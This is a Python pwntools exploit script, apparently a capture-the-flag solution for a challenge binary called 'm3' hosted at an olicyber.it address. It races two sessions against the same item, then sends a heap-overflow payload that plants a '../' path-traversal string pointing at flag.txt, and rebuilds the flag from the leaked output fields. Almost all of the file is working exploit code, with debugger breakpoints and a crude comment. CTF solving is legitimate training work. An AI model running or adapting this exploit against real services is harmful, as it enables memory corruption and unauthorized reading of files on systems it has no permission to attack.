#!/usr/bin/env python3

from pwn import *

exe = ELF("./m3_patched")

context.binary = exe
context.terminal = ("tmux", "splitw", "-h")
flagId = "../../../../../../../../flag.txt" # no fucking way esattamente 32 caratteri

def conn(flag=False):
    if args.REMOTE:
        r = remote("mmm.challs.olicyber.it", 16009)
    else:
        if not flag:
            r = process([exe.path])
        else:
            r = gdb.debug([exe.path], """
                b *undo_changes+675
                b *check_token
                c
            """)
    return r


def main():
    r1, r2 = conn(True), conn()

    r1.sendlineafter(b": \n", b"1")
    r1.sendlineafter(b": \n", b"20")
    r1.sendlineafter(b": \n", b"a"*8)

    r1.recvuntil(b"ID: ")
    id = r1.recvline().strip().decode()
    r1.recvuntil(b"token: ")
    secret = r1.recvline().strip().decode()

    print(id, secret)

    r1.sendlineafter(b": \n", b"2")
    r1.sendlineafter(b": \n", id.encode())
    # stop for secret / heapov

    r2.sendlineafter(b": \n", b"2")
    r2.sendlineafter(b": \n", id.encode())
    r2.sendlineafter(b": \n", secret.encode())

    r2.sendlineafter(b": \n", b"2")
    payload = (
        b"a"*16 + b'\x00'*8 + b'\x61'.ljust(8, b'\x00') +
        (flagId.encode() if args.REMOTE else id.encode())
        + b"a"*32
    ).replace(b"\x00", b"\x01")
    r2.sendlineafter(b": \n", payload)
    r2.sendlineafter(b": \n", b"3")
    r2.recvall(timeout=1)
    r2.close()

    r1.sendlineafter(b": \n", secret.encode())

    r1.sendlineafter(b": \n", b"4")

    r1.recvuntil(b"token: f")
    flag = r1.recvline().strip().decode()
    r1.recvuntil(b"price: ")
    flag += p32(int(r1.recvline().strip().decode())).decode()
    r1.recvuntil(b"description: \n\t\t ")
    flag += r1.recvline().strip().decode()
    
    print('f' + flag)

    r1.close()

if __name__ == "__main__":
    main()
